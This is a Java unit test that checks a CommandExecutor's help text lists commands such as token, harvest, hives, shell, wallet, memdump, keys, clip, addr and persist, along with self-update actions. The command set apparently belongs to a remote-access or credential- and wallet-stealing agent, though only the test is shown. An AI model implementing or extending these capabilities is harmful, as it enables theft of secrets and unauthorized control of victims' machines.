package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;

import org.junit.jupiter.api.Test;

class HelpTest {
	private static final List<String> COMMANDS = List.of(
		"help", "ping", "ops", "token", "screenshot", "harvest", "bootstrap", "hives",
		"ls", "cd", "cat", "download", "upload", "shell", "wallet", "memdump", "keys",
		"clip", "addr", "persist", "sleep", "update", "gateway", "clear", "kill");

	@Test
	void listsEveryCommand() {
		String help = CommandExecutor.helpText();
		for (String command : COMMANDS) {
			assertTrue(help.contains("`" + command), "missing `" + command + "` in help");
		}
	}

	@Test
	void listsEveryUpdateAction() {
		String help = CommandExecutor.helpText();
		for (String action : List.of("check", "stage", "apply", "rollback", "auto", "status")) {
			assertTrue(help.contains(action), "missing update " + action);
		}
	}
}
